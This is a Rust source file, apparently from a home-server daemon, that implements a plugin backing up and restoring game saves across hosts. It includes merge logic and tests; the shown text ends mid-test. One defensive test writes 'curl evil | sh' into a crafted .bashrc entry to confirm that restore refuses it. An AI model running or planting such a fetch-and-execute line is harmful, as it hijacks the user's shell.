//! The `game-saves` backup KIND: one instance per game with saves on this host,
//! named from its ludusavi title ([`assign_ids`]) so every host sharing a
//! backup pool files the same game under the same instance. Runs as the
//! daemon's user — everything it touches lives under `$HOME`.
//!
//! Layout is the default flat `[kind, instance]` with no host segment: the
//! writer host is recorded in the backup's record and the payload's manifest.
//!
//! Sync (`restore` latest, then `backup`) is safe to repeat: restore never
//! overwrites local progress and backup publishes a merge, so a game played
//! on one host only never produces conflicts, and a host missing part of a
//! game still publishes all of it.
//!
//! Manifest integrity rests on the payload's per-file sha256s; the seam does
//! not hand restore the store record's checksum to verify `manifest.json`
//! against.

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use plugin_toolkit::backup::BackupKindPlugin;
use plugin_toolkit::contract::backup::{BackupOutcome, BackupRecord};
use plugin_toolkit::serde_json;
use serde::Deserialize;

use crate::saves::fsx;
use crate::saves::layout::{
    HOME, Layout, STEAM_COMMON, STEAM_USERDATA, WINE_C, WINE_USER, drive_of_user, prefix_dirs,
    user_of_drive,
};
use crate::saves::ludusavi::{CustomGame, Ludusavi, Scanner};
use crate::saves::manifest::{FILES_DIR, MANIFEST_MAX, Manifest, capture, checked_rel, mtime_ns};
use crate::saves::restore::{self, Placer, RestoreReport};
use crate::saves::select::{self, STEAM_AUTOCLOUD, Selection};
use crate::saves::state::{BaseEntry, Index, Store, key};
use crate::saves::{assign_ids, guard, merge, running};

pub const KIND: &str = "game-saves";

/// Restoring into a prefix ludusavi didn't find for this game would mean
/// guessing (or fabricating) one, which breaks Proton/Heroic's own prefix
/// initialization on first launch.
pub const PREFIX_DEFERRED: &str = "prefix not initialized";

/// A backup refreshes the instance index (a full ludusavi scan) once it is
/// this old, so `instances` never has to scan.
const INDEX_MAX_AGE_MS: i64 = 6 * 60 * 60 * 1000;

pub struct GameSavesKind;

impl BackupKindPlugin for GameSavesKind {
    fn kind(&self) -> &str {
        KIND
    }

    fn title(&self) -> String {
        "Game saves".to_string()
    }

    fn instances(&self) -> Result<Vec<String>, String> {
        with_host(instances_in)
    }

    fn backup(&self, payload_dir: &Path, instance: &str) -> Result<BackupOutcome, String> {
        with_host(|h| backup_in(h, payload_dir, instance))
    }

    fn restore(&self, payload_dir: &Path, instance: &str) -> Result<(), String> {
        let report = with_host(|h| restore_in(h, payload_dir, instance))?;
        let summary = format!(
            "[game-saves] restore {instance}: {} written, {} replaced, {} unchanged, {} kept local, {} conflict(s), {} deferred",
            report.written,
            report.fast_forwarded,
            report.unchanged,
            report.kept_local,
            report.conflicts.len(),
            report.deferred.len()
        );
        if report.conflicts.is_empty() && report.deferred.is_empty() {
            plugin_toolkit::tracing::info!("{summary}");
        } else {
            plugin_toolkit::tracing::warn!(
                "{summary}; conflicts={:?} deferred={:?}",
                report.conflicts,
                report.deferred
            );
        }
        if report.errors.is_empty() {
            Ok(())
        } else {
            Err(format!(
                "{summary}; {} error(s): {}",
                report.errors.len(),
                report.errors.join("; ")
            ))
        }
    }
}

/// Everything the kind needs about this host; tests build one over fixtures.
pub struct Host<'a> {
    pub layout: Layout,
    pub scanner: &'a dyn Scanner,
    pub store: Store,
    pub custom: Vec<CustomGame>,
    pub hostname: String,
    /// Which process, if any, is using these game paths.
    pub busy: fn(&[PathBuf]) -> Option<String>,
}

fn with_host<T>(f: impl FnOnce(&Host) -> Result<T, String>) -> Result<T, String> {
    let home = std::env::var_os("HOME")
        .filter(|h| !h.is_empty())
        .ok_or("HOME is not set")?;
    let home = PathBuf::from(home);
    let layout = Layout::detect(&home);
    let custom = custom_games();
    let ludusavi = Ludusavi::prepare(&layout, &custom)?;
    f(&Host {
        layout,
        scanner: &ludusavi,
        store: Store::new(&home),
        custom,
        hostname: hostname(),
        busy: running::busy,
    })
}

/// Game ids from the index the last full scan wrote; scans only when there is
/// no index yet.
pub fn instances_in(h: &Host) -> Result<Vec<String>, String> {
    let index = match h.store.index() {
        Some(i) => i,
        None => refresh_index(h)?,
    };
    Ok(index.titles.into_keys().collect())
}

/// Full scan → every title with at least one capturable save.
pub fn refresh_index(h: &Host) -> Result<Index, String> {
    let scan = h.scanner.preview(&[])?;
    let titles = scan
        .games
        .keys()
        .filter(|t| !select::select(&h.layout, &scan.files(t)).files.is_empty())
        .map(String::as_str);
    let index = Index {
        scanned_ms: plugin_toolkit::time::now().unix_millis(),
        titles: assign_ids(titles),
    };
    h.store.save_index(&index)?;
    Ok(index)
}

fn title_of(h: &Host, instance: &str) -> Result<String, String> {
    let stale = h.store.index().is_none_or(|i| {
        plugin_toolkit::time::now().unix_millis() - i.scanned_ms > INDEX_MAX_AGE_MS
    });
    if stale && let Err(e) = refresh_index(h) {
        plugin_toolkit::tracing::warn!("[game-saves] index refresh failed: {e}");
    }
    if let Some(t) = h.store.index().and_then(|mut i| i.titles.remove(instance)) {
        return Ok(t);
    }
    if let Some(m) = h.store.last(instance)? {
        return Ok(m.title);
    }
    Err(format!("no game `{instance}` on this host"))
}

/// Publish `instance`: the last state this host synced, with its local
/// progress merged over it, into `payload_dir`.
pub fn backup_in(h: &Host, payload_dir: &Path, instance: &str) -> Result<BackupOutcome, String> {
    let title = title_of(h, instance)?;
    let sel = scan_title(h, &title)?;
    if let Some(who) = (h.busy)(&sel.guards(&h.layout.home)) {
        return Err(format!(
            "{title} looks to be running ({who}); not backing up"
        ));
    }
    let last = h.store.last(instance)?;
    let mut base = h.store.base(instance)?;
    let sel = with_known_files(sel, last.as_ref());
    let plan = merge::plan(last.as_ref(), &base, &sel.files, |sha| {
        h.store.blob(instance, sha)
    })?;
    let carried = plan
        .files
        .iter()
        .filter(|f| f.origin == crate::saves::manifest::Origin::Blob)
        .count();
    let mut notes = Vec::new();
    if carried > 0 {
        notes.push(format!("{carried} carried from earlier backups"));
    }
    if !plan.diverged.is_empty() {
        notes.push(format!(
            "{} diverged from the pool, this host's copy kept",
            plan.diverged.len()
        ));
    }
    if sel.registry_hives > 0 {
        notes.push("registry-based saves not captured (wine registry hives are excluded)".into());
    }
    if !sel.skipped.is_empty() {
        notes.push(format!("skipped {}", sel.skipped.len()));
        plugin_toolkit::tracing::info!("[game-saves] {instance}: skipped {:?}", sel.skipped);
    }
    let suffix = if notes.is_empty() {
        String::new()
    } else {
        format!("; {}", notes.join("; "))
    };

    if let Some(published) = latest_published(payload_dir, instance)
        && plan.unchanged_from(Some(&published))
    {
        record_local_base(&mut base, &sel, &plan.local_keys, &plan.parts);
        h.store.save_base(instance, &base)?;
        if last.as_ref() != Some(&published) {
            h.store.save_last(instance, &published)?;
            h.store.prune_blobs(instance, &shas(&published))?;
        }
        return Ok(BackupOutcome::unchanged(Some(format!(
            "{title} ({instance}) from {}: unchanged{suffix}",
            h.hostname
        ))));
    }

    let (manifest, checksum, stats) =
        capture(&plan.files, payload_dir, instance, &title, &h.hostname).map_err(|e| {
            if sel.registry_hives > 0 {
                format!("{e}; {title} keeps its saves in the wine registry, which is not synced")
            } else {
                e
            }
        })?;
    record_local_base(&mut base, &sel, &plan.local_keys, &manifest.parts);
    h.store.save_base(instance, &base)?;
    h.store.save_last(instance, &manifest)?;
    h.store.prune_blobs(instance, &shas(&manifest))?;
    if !stats.skipped.is_empty() {
        plugin_toolkit::tracing::info!("[game-saves] {instance}: vanished {:?}", stats.skipped);
    }
    Ok(BackupOutcome {
        checksum: Some(format!("sha256:{checksum}")),
        note: Some(format!(
            "{title} ({instance}) from {}: {} file(s), {} bytes across {}{suffix}",
            h.hostname,
            stats.files,
            stats.bytes,
            manifest
                .parts
                .keys()
                .cloned()
                .collect::<Vec<_>>()
                .join(", ")
        )),
        ..Default::default()
    })
}

/// The core store's record at a committed slot's root, beside [`PAYLOAD`].
const STORE_RECORD: &str = "manifest.json";
const PAYLOAD: &str = "payload";

/// The game-saves manifest of the newest backup of `instance` the core store
/// would list in the pool holding `payload_dir`, if that backup's payload is
/// intact. Unchanged is judged against this rather than this host's `last`,
/// which may name a slot the store never committed or another target's pool.
///
/// Relies on the kind's flat `[kind, instance]` layout: `payload_dir` is
/// `<pool>/<kind>/<instance>/<id>/payload`, so every slot of the instance is
/// a sibling of its slot.
fn latest_published(payload_dir: &Path, instance: &str) -> Option<Manifest> {
    if payload_dir.file_name()? != PAYLOAD {
        return None;
    }
    let slot = payload_dir.parent()?;
    let instance_dir = slot.parent()?;
    let newest = std::fs::read_dir(instance_dir)
        .ok()?
        .flatten()
        .filter(|e| e.path() != slot)
        .filter_map(|e| committed_id(&e, instance))
        .max()?;
    let payload = instance_dir.join(newest).join(PAYLOAD);
    if !std::fs::symlink_metadata(&payload)
        .ok()?
        .file_type()
        .is_dir()
    {
        return None;
    }
    let m = Manifest::read(&payload)
        .ok()
        .filter(|m| m.instance == instance)?;
    payload_intact(&payload, &m).then_some(m)
}

/// The slot id of `entry` if the core store counts it as a committed backup of
/// `instance`: a real dir holding a regular-file record whose id is valid and
/// names the dir. Mirrors the store's `load_manifest`.
fn committed_id(entry: &std::fs::DirEntry, instance: &str) -> Option<String> {
    let name = entry.file_name().into_string().ok()?;
    if !entry.file_type().ok()?.is_dir() {
        return None;
    }
    let raw = fsx::read_regular_capped(&entry.path().join(STORE_RECORD), MANIFEST_MAX).ok()?;
    let rec: BackupRecord = serde_json::from_slice(&raw).ok()?;
    let id_ok = !rec.id.is_empty()
        && rec.id.len() <= 255
        && !rec.id.starts_with('.')
        && !rec
            .id
            .chars()
            .any(|c| std::path::is_separator(c) || c == '\0');
    (id_ok && rec.id == name && rec.kind == KIND && rec.instance == instance).then_some(name)
}

/// Every file `m` lists is in `payload` as a regular file of its recorded
/// size, with no symlink on the way.
fn payload_intact(payload: &Path, m: &Manifest) -> bool {
    m.parts.iter().all(|(part, entries)| {
        entries.iter().all(|e| {
            let (Ok(part), Ok(rel)) = (checked_rel(part), checked_rel(&e.relpath)) else {
                return false;
            };
            let rel = Path::new(FILES_DIR).join(part).join(rel);
            let mut at = payload.to_path_buf();
            let mut comps = rel.components().peekable();
            while let Some(c) = comps.next() {
                at.push(c);
                let Ok(meta) = std::fs::symlink_metadata(&at) else {
                    return false;
                };
                let ok = if comps.peek().is_some() {
                    meta.file_type().is_dir()
                } else {
                    meta.file_type().is_file() && meta.len() == e.size
                };
                if !ok {
                    return false;
                }
            }
            true
        })
    })
}

/// Restore `instance` from `payload_dir`, possibly written by another host for
/// a game this host has never backed up. Each part goes where ludusavi finds
/// the game here; parts with no safe local home are deferred, and their bytes
/// kept so this host's next backup still carries them.
pub fn restore_in(h: &Host, payload_dir: &Path, instance: &str) -> Result<RestoreReport, String> {
    let manifest = Manifest::read(payload_dir)?;
    if manifest.instance != instance {
        return Err(format!(
            "payload holds `{}`, not `{instance}`",
            manifest.instance
        ));
    }
    let sel = scan_title(h, &manifest.title)?;
    let placer = HostPlacer {
        h,
        sel: &sel,
        manifest: &manifest,
        custom: custom_dirs(h, &manifest.title),
    };
    let mut guards = sel.guards(&h.layout.home);
    for part in manifest.parts.keys() {
        if let Ok(a) = placer.anchor(part) {
            guards.extend(prefix_dirs(&a));
        }
    }
    if let Some(who) = (h.busy)(&guards) {
        return Err(format!(
            "{} looks to be running ({who}); not restoring",
            manifest.title
        ));
    }
    let mut base = h.store.base(instance)?;
    let stamp = plugin_toolkit::time::now().compact();
    let mut report = restore::restore(payload_dir, &manifest, &base, &stamp, &placer);

    base.extend(report.synced.iter().cloned());
    h.store.save_base(instance, &base)?;
    for (src, sha) in &report.to_cache {
        if let Err(e) = h.store.cache_blob(instance, src, sha) {
            report.errors.push(format!("keep for later backups: {e}"));
        }
    }
    h.store.save_last(instance, &manifest)?;
    h.store.prune_blobs(instance, &shas(&manifest))?;
    if report.written + report.fast_forwarded > 0
        && let Some(mut index) = h.store.index()
        && !index.titles.contains_key(instance)
    {
        index
            .titles
            .insert(instance.to_string(), manifest.title.clone());
        h.store.save_index(&index)?;
    }
    Ok(report)
}

/// Published local files become this host's base: synced as of now.
fn record_local_base(
    base: &mut crate::saves::state::Base,
    sel: &Selection,
    local_keys: &BTreeSet<String>,
    parts: &std::collections::BTreeMap<String, Vec<crate::saves::manifest::FileEntry>>,
) {
    for f in &sel.files {
        let rel = crate::saves::manifest::slash_path(&f.rel);
        let k = key(f.part, &rel);
        if !local_keys.contains(&k) {
            continue;
        }
        let published = parts
            .get(f.part)
            .and_then(|es| es.iter().find(|e| e.relpath == rel));
        if let (Some(e), Ok(mtime)) = (published, mtime_ns(&f.abs)) {
            base.insert(
                k,
                BaseEntry {
                    sha256: e.sha256.clone(),
                    size: e.size,
                    mtime_ns: mtime,
                },
            );
        }
    }
}

/// Add files of `last` that exist where this host keeps their part but that
/// ludusavi didn't report (a save restored from another host that its
/// manifest patterns don't match), so they count as local instead of needing
/// a blob.
fn with_known_files(mut sel: Selection, last: Option<&Manifest>) -> Selection {
    let Some(last) = last else {
        return sel;
    };
    let known: BTreeSet<(&str, PathBuf)> =
        sel.files.iter().map(|f| (f.part, f.rel.clone())).collect();
    let mut extra = Vec::new();
    for (part, entries) in &last.parts {
        let Some((part, anchors)) = sel.anchors.get_key_value(part.as_str()) else {
            continue;
        };
        let [anchor] = anchors.iter().collect::<Vec<_>>()[..] else {
            continue;
        };
        for e in entries {
            let Ok(rel) = crate::saves::manifest::checked_rel(&e.relpath) else {
                continue;
            };
            let abs = anchor.join(&rel);
            if !known.contains(&(*part, rel.clone()))
                && std::fs::symlink_metadata(&abs).is_ok_and(|m| m.is_file())
                && !(*part == HOME && guard::home_denied(&rel))
            {
                extra.push(crate::saves::select::SourceFile { part, rel, abs });
            }
        }
    }
    sel.files.extend(extra);
    sel
}

fn scan_title(h: &Host, title: &str) -> Result<Selection, String> {
    let scan = h.scanner.preview(&[title])?;
    Ok(select::select(&h.layout, &scan.files(title)))
}

fn shas(m: &Manifest) -> BTreeSet<String> {
    m.parts
        .values()
        .flatten()
        .map(|e| e.sha256.clone())
        .collect()
}

/// Home-relative paths the operator configured for `title`.
fn custom_dirs(h: &Host, title: &str) -> Vec<PathBuf> {
    h.custom
        .iter()
        .filter(|g| g.name == title)
        .flat_map(|g| g.files.iter())
        .filter_map(|f| {
            let abs = crate::saves::ludusavi::expand_home(&h.layout.home, f);
            Path::new(&abs)
                .strip_prefix(&h.layout.home)
                .ok()
                .map(Path::to_path_buf)
        })
        .collect()
}

struct HostPlacer<'a> {
    h: &'a Host<'a>,
    sel: &'a Selection,
    manifest: &'a Manifest,
    custom: Vec<PathBuf>,
}

impl HostPlacer<'_> {
    fn found(&self, part: &str) -> Result<Option<PathBuf>, String> {
        let found: Vec<&PathBuf> = self.sel.anchors.get(part).into_iter().flatten().collect();
        match found.as_slice() {
            [] => Ok(None),
            [one] => Ok(Some((*one).clone())),
            many => Err(format!("{} local locations; not guessing", many.len())),
        }
    }

    /// Never write Steam userdata for an app Steam hasn't installed here.
    fn steam_apps_installed(&self, part: &str) -> Result<(), String> {
        let appids: BTreeSet<&str> = self
            .manifest
            .parts
            .get(part)
            .into_iter()
            .flatten()
            .filter_map(|e| e.relpath.split('/').next())
            .collect();
        match appids
            .iter()
            .find(|a| !self.h.layout.steam_app_installed(a))
        {
            Some(a) => Err(format!("Steam app {a} not installed on this host")),
            None => Ok(()),
        }
    }
}

impl Placer for HostPlacer<'_> {
    fn anchor(&self, part: &str) -> Result<PathBuf, String> {
        let layout = &self.h.layout;
        if part == STEAM_USERDATA {
            self.steam_apps_installed(part)?;
        }
        if let Some(a) = self.found(part)? {
            return Ok(a);
        }
        match part {
            HOME if self.sel.home_rels.is_empty() && self.custom.is_empty() => {
                Err("no local saves of this game to place `home` files beside".to_string())
            }
            HOME => Ok(layout.home.clone()),
            STEAM_USERDATA => layout
                .sole_steam_user()
                .ok_or_else(|| "no single signed-in Steam account on this host".to_string()),
            STEAM_COMMON => {
                let dir = self
                    .manifest
                    .parts
                    .get(part)
                    .and_then(|es| es.first())
                    .and_then(|e| e.relpath.split('/').next())
                    .unwrap_or_default();
                layout
                    .steam_common_with(dir)
                    .ok_or_else(|| format!("`{dir}` not installed on this host"))
            }
            // One side of a prefix found locally locates the other.
            WINE_C => self
                .found(WINE_USER)?
                .and_then(|u| drive_of_user(&u))
                .ok_or_else(|| PREFIX_DEFERRED.to_string()),
            WINE_USER => self
                .found(WINE_C)?
                .and_then(|d| user_of_drive(&d, &layout.home))
                .ok_or_else(|| PREFIX_DEFERRED.to_string()),
            _ => Err(PREFIX_DEFERRED.to_string()),
        }
    }

    fn allow(&self, part: &str, rel: &Path) -> Result<(), String> {
        match part {
            HOME => guard::home_allowed(rel, &self.sel.home_rels, &self.custom),
            STEAM_USERDATA
                if rel
                    .components()
                    .nth(1)
                    .is_some_and(|c| c.as_os_str() == "remote")
                    || rel.file_name().is_some_and(|n| n == STEAM_AUTOCLOUD) =>
            {
                Err("Steam Cloud manages this file".to_string())
            }
            _ => Ok(()),
        }
    }
}

/// Custom games from orca's `game-saves:native-paths` config row:
/// `{"games": [{"name": "...", "files": ["~/..."]}], "paths": ["~/..."]}`.
/// Each bare `paths` entry becomes a game named after the whole path, so two
/// paths never collapse into one game.
fn custom_games() -> Vec<CustomGame> {
    #[derive(Deserialize, Default)]
    struct NativePaths {
        #[serde(default)]
        games: Vec<CustomGame>,
        #[serde(default)]
        paths: Vec<String>,
    }
    let cfg = match crate::config::row_json(KIND, "native-paths") {
        Ok(Some(json)) => serde_json::from_str::<NativePaths>(&json).unwrap_or_else(|e| {
            plugin_toolkit::tracing::warn!(
                "[game-saves] ignoring malformed native-paths config: {e}"
            );
            NativePaths::default()
        }),
        Ok(None) => NativePaths::default(),
        Err(e) => {
            plugin_toolkit::tracing::warn!("[game-saves] custom games unavailable: {e}");
            NativePaths::default()
        }
    };
    let mut games = cfg.games;
    for p in cfg.paths {
        let name = p.trim_end_matches('/').to_string();
        if !name.is_empty() {
            games.push(CustomGame {
                name,
                files: vec![p],
            });
        }
    }
    games
}

/// Read without a subprocess (the plugin may be forked from the daemon).
fn hostname() -> String {
    ["/proc/sys/kernel/hostname", "/etc/hostname"]
        .iter()
        .find_map(|p| {
            std::fs::read_to_string(p)
                .ok()
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
        })
        .unwrap_or_else(|| "unknown".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::saves::ludusavi::Preview;
    use crate::saves::manifest::{MANIFEST_FILE, mtime_ns};
    use crate::saves::testutil::{TempDir, set_mtime_secs, write};
    use std::cell::Cell;
    use std::fs;

    /// Serves a real-schema ludusavi preview fixture rooted at `home`.
    struct Fixture {
        preview: Preview,
        full_scans: Cell<usize>,
    }

    impl Fixture {
        fn new(raw: &str, home: &Path) -> Self {
            let raw = raw.replace("{HOME}", &home.display().to_string());
            Self {
                preview: Preview::parse(&raw).unwrap(),
                full_scans: Cell::new(0),
            }
        }

        /// Create every non-ignored file the fixture lists.
        fn materialize(&self) {
            for g in self.preview.games.values() {
                for (p, f) in &g.files {
                    if !f.ignored {
                        write(Path::new(p), p);
                    }
                }
            }
        }
    }

    impl Scanner for Fixture {
        fn preview(&self, titles: &[&str]) -> Result<Preview, String> {
            let mut p = self.preview.clone();
            if titles.is_empty() {
                self.full_scans.set(self.full_scans.get() + 1);
            } else {
                p.games.retain(|k, _| titles.contains(&k.as_str()));
            }
            Ok(p)
        }
    }

    const BRAGI: &str = include_str!("saves/fixtures/bragi-preview.json");
    const HEMLOCK: &str = include_str!("saves/fixtures/hemlock-preview.json");

    fn idle(_: &[PathBuf]) -> Option<String> {
        None
    }

    fn host<'a>(t: &TempDir, name: &str, home: &Path, scanner: &'a Fixture) -> Host<'a> {
        Host {
            layout: Layout::detect(home),
            scanner,
            store: Store::at(t.path().join(format!("{name}-state"))),
            custom: Vec::new(),
            hostname: name.to_string(),
            busy: idle,
        }
    }

    fn homes(t: &TempDir) -> (PathBuf, PathBuf) {
        let b = t.path().join("bragi/var/home/skey");
        let h = t.path().join("hemlock/home/skey");
        let steam = ".local/share/Steam";
        fs::create_dir_all(b.join(format!("{steam}/userdata/64751656"))).unwrap();
        write(
            &b.join(format!("{steam}/steamapps/appmanifest_1245620.acf")),
            "x",
        );
        fs::create_dir_all(h.join(format!("{steam}/userdata/64751656"))).unwrap();
        fs::create_dir_all(h.join(format!("{steam}/steamapps/compatdata/0"))).unwrap();
        (b, h)
    }

    /// A pool slot for `instance`, numbered so each sync gets a fresh one.
    fn slot(t: &TempDir, instance: &str, n: usize) -> PathBuf {
        let p = t.path().join(format!("pool/{KIND}/{instance}/{n}/payload"));
        fs::create_dir_all(&p).unwrap();
        p
    }

    /// `backup.sync` for one instance: restore latest (if any), then back up.
    fn sync(h: &Host, latest: Option<&Path>, next: &Path, instance: &str) -> RestoreReport {
        let r = latest
            .map(|l| restore_in(h, l, instance).unwrap())
            .unwrap_or_default();
        assert!(r.errors.is_empty(), "{:?}", r.errors);
        backup_in(h, next, instance).unwrap();
        r
    }

    fn artifacts(dir: &Path) -> Vec<String> {
        let mut out = Vec::new();
        let mut stack = vec![dir.to_path_buf()];
        while let Some(d) = stack.pop() {
            for e in fs::read_dir(&d).into_iter().flatten().flatten() {
                let p = e.path();
                if p.is_dir() {
                    stack.push(p);
                } else if select::is_orca_artifact(&e.file_name().to_string_lossy()) {
                    out.push(p.display().to_string());
                }
            }
        }
        out
    }

    const HADES_BRAGI: &str = "Games/Heroic/Prefixes/Hades/drive_c/users/steamuser/Documents/Saved Games/Hades/Profile1.sav";
    const HADES_HEMLOCK: &str =
        "Games/Heroic/Prefixes/default/drive_c/users/skey/Documents/Saved Games/Hades/Profile1.sav";

    #[test]
    fn instances_come_from_the_index_without_rescanning() {
        let t = TempDir::new();
        let (b, _) = homes(&t);
        let f = Fixture::new(BRAGI, &b);
        f.materialize();
        let h = host(&t, "bragi", &b, &f);
        let got = instances_in(&h).unwrap();
        let bg3 = crate::saves::game_id("Baldur's Gate 3");
        let mut want = vec![
            bg3.as_str(),
            "diablo-iv",
            "elden-ring",
            "hades",
            "stardew-valley",
        ];
        want.sort();
        assert_eq!(got, want);
        assert_eq!(instances_in(&h).unwrap(), want);
        assert_eq!(f.full_scans.get(), 1);
    }

    #[test]
    fn backup_captures_portable_parts_and_notes_exclusions() {
        let t = TempDir::new();
        let (b, _) = homes(&t);
        let f = Fixture::new(BRAGI, &b);
        f.materialize();
        let h = host(&t, "bragi", &b, &f);
        let payload = slot(&t, "hades", 1);
        let out = backup_in(&h, &payload, "hades").unwrap();
        let note = out.note.unwrap();
        assert!(
            note.starts_with("Hades (hades) from bragi: 1 file(s)"),
            "{note}"
        );
        assert!(note.contains("registry-based saves not captured"), "{note}");
        assert!(out.checksum.unwrap().starts_with("sha256:"));
        let m = Manifest::read(&payload).unwrap();
        assert_eq!((m.title.as_str(), m.host.as_str()), ("Hades", "bragi"));
        assert_eq!(
            m.parts["wine-user"][0].relpath,
            "Documents/Saved Games/Hades/Profile1.sav"
        );
        assert!(backup_in(&h, &slot(&t, "x", 1), "not-a-game").is_err());
    }

    #[test]
    fn bragi_saves_restore_into_hemlocks_shared_prefix() {
        let t = TempDir::new();
        let (b, he) = homes(&t);
        let (bf, hf) = (Fixture::new(BRAGI, &b), Fixture::new(HEMLOCK, &he));
        bf.materialize();
        hf.materialize();
        let (bh, hh) = (host(&t, "bragi", &b, &bf), host(&t, "hemlock", &he, &hf));
        set_mtime_secs(&b.join(HADES_BRAGI), 7_000);
        let payload = slot(&t, "hades", 1);
        backup_in(&bh, &payload, "hades").unwrap();

        let r = restore_in(&hh, &payload, "hades").unwrap();
        assert!(r.errors.is_empty() && r.deferred.is_empty(), "{r:?}");
        assert_eq!(r.written, 1);
        let dst = he.join(HADES_HEMLOCK);
        assert_eq!(
            fs::read(&dst).unwrap(),
            fs::read(b.join(HADES_BRAGI)).unwrap()
        );
        assert_eq!(mtime_ns(&dst).unwrap(), 7_000 * 1_000_000_000);

        let again = restore_in(&hh, &payload, "hades").unwrap();
        assert_eq!((again.written, again.unchanged), (0, 1));
    }

    #[test]
    fn play_on_one_host_only_never_conflicts() {
        let t = TempDir::new();
        let (b, _) = homes(&t);
        let f = Fixture::new(BRAGI, &b);
        f.materialize();
        let h = host(&t, "bragi", &b, &f);
        let save = b.join(HADES_BRAGI);
        let mut latest: Option<PathBuf> = None;
        for cycle in 1..=5 {
            write(&save, &format!("progress {cycle}"));
            set_mtime_secs(&save, 10_000 + cycle as u64);
            let next = slot(&t, "hades", cycle);
            let r = sync(&h, latest.as_deref(), &next, "hades");
            assert!(
                r.conflicts.is_empty() && r.replaced.is_empty(),
                "cycle {cycle}: {r:?}"
            );
            latest = Some(next);
        }
        assert!(artifacts(&b).is_empty(), "{:?}", artifacts(&b));
        let m = Manifest::read(latest.as_deref().unwrap()).unwrap();
        assert_eq!(
            m.parts["wine-user"][0].sha256,
            plugin_toolkit::hash::sha256_hex(b"progress 5")
        );
    }

    #[test]
    fn progress_on_both_hosts_is_never_lost() {
        let t = TempDir::new();
        let (b, he) = homes(&t);
        let (bf, hf) = (Fixture::new(BRAGI, &b), Fixture::new(HEMLOCK, &he));
        bf.materialize();
        hf.materialize();
        let (bh, hh) = (host(&t, "bragi", &b, &bf), host(&t, "hemlock", &he, &hf));
        let (bs, hs) = (b.join(HADES_BRAGI), he.join(HADES_HEMLOCK));

        // Both hosts in sync on v1.
        write(&bs, "v1");
        let s1 = slot(&t, "hades", 1);
        sync(&bh, None, &s1, "hades");
        let s2 = slot(&t, "hades", 2);
        sync(&hh, Some(&s1), &s2, "hades");
        assert_eq!(fs::read_to_string(&hs).unwrap(), "v1");

        // Both play offline, hemlock with an OLDER clock.
        write(&bs, "bragi-progress");
        set_mtime_secs(&bs, 50_000);
        let s3 = slot(&t, "hades", 3);
        sync(&bh, Some(&s2), &s3, "hades");
        write(&hs, "hemlock-progress");
        set_mtime_secs(&hs, 40_000);

        let s4 = slot(&t, "hades", 4);
        let r = sync(&hh, Some(&s3), &s4, "hades");
        assert_eq!(r.conflicts.len(), 1);
        assert_eq!(fs::read_to_string(&hs).unwrap(), "hemlock-progress");
        assert_eq!(
            fs::read_to_string(&r.conflicts[0]).unwrap(),
            "bragi-progress"
        );

        // bragi hasn't touched its save since publishing it, so it takes
        // hemlock's — with its own moved aside.
        let s5 = slot(&t, "hades", 5);
        let r = sync(&bh, Some(&s4), &s5, "hades");
        assert_eq!(fs::read_to_string(&bs).unwrap(), "hemlock-progress");
        assert_eq!(
            fs::read_to_string(&r.replaced[0]).unwrap(),
            "bragi-progress"
        );
    }

    #[test]
    fn partial_hosts_carry_deferred_parts_forward_or_refuse() {
        let t = TempDir::new();
        let (b, he) = homes(&t);
        let (bf, hf) = (Fixture::new(BRAGI, &b), Fixture::new(HEMLOCK, &he));
        bf.materialize();
        hf.materialize();
        let (bh, hh) = (host(&t, "bragi", &b, &bf), host(&t, "hemlock", &he, &hf));

        let s1 = slot(&t, "elden-ring", 1);
        backup_in(&bh, &s1, "elden-ring").unwrap();
        let bragi_parts = Manifest::read(&s1).unwrap().parts;
        assert_eq!(bragi_parts.len(), 2);

        // hemlock has neither the prefix nor the app installed.
        let r = restore_in(&hh, &s1, "elden-ring").unwrap();
        assert_eq!(r.written, 0);
        assert_eq!(r.deferred.len(), 2, "{:?}", r.deferred);
        assert!(
            !he.join(".local/share/Steam/steamapps/compatdata/1245620")
                .exists()
        );
        assert!(
            !he.join(".local/share/Steam/userdata/64751656/1245620")
                .exists()
        );

        let s2 = slot(&t, "elden-ring", 2);
        backup_in(&hh, &s2, "elden-ring").unwrap();
        assert_eq!(Manifest::read(&s2).unwrap().parts, bragi_parts);

        fs::remove_dir_all(t.path().join("hemlock-state/instances/elden-ring/blobs")).unwrap();
        let e = backup_in(&hh, &slot(&t, "elden-ring", 3), "elden-ring").unwrap_err();
        assert!(e.contains("refusing to publish a partial backup"), "{e}");
    }

    #[test]
    fn home_files_need_a_local_save_dir_and_never_hit_the_deny_list() {
        let t = TempDir::new();
        let (b, he) = homes(&t);
        let (bf, hf) = (Fixture::new(BRAGI, &b), Fixture::new(HEMLOCK, &he));
        bf.materialize();
        hf.materialize();
        let (bh, hh) = (host(&t, "bragi", &b, &bf), host(&t, "hemlock", &he, &hf));
        let s1 = slot(&t, "stardew-valley", 1);
        backup_in(&bh, &s1, "stardew-valley").unwrap();

        // hemlock has no Stardew saves: nothing in $HOME to anchor on.
        let r = restore_in(&hh, &s1, "stardew-valley").unwrap();
        assert_eq!(r.written, 0);
        assert_eq!(r.deferred.len(), 1);

        // A crafted pool entry aimed at a shell rc file is refused on bragi.
        let mut m = Manifest::read(&s1).unwrap();
        let mut evil = m.parts["home"][0].clone();
        write(&s1.join("files/home/.bashrc"), "curl evil | sh");
        evil.relpath = ".bashrc".into();
        evil.sha256 = plugin_toolkit::hash::sha256_hex(b"curl evil | sh");
        evil.size = 14;
        m.parts.get_mut("home").unwrap().push(evil);
        m.write(&s1).unwrap();
        let r = restore_in(&bh, &s1, "stardew-valley").unwrap();
        assert_eq!(r.errors.len(), 1, "{:?}", r.errors);
        assert!(!b.join(".bashrc").exists());
    }

    #[cfg(unix)]
    #[test]
    fn var_home_symlinked_home_classifies_and_restores() {
        let t = TempDir::new();
        let real = t.path().join("var/home/skey");
        fs::create_dir_all(&real).unwrap();
        fs::create_dir_all(t.path().join("home")).unwrap();
        let link = t.path().join("home/skey");
        std::os::unix::fs::symlink(&real, &link).unwrap();
        // ludusavi reports canonical paths; $HOME is the symlink.
        let f = Fixture::new(BRAGI, &real);
        f.materialize();
        let h = host(&t, "bragi", &link, &f);
        let payload = slot(&t, "stardew-valley", 1);
        let out = backup_in(&h, &payload, "stardew-valley").unwrap();
        assert!(out.note.unwrap().contains("across home"));
        let r = restore_in(&h, &payload, "stardew-valley").unwrap();
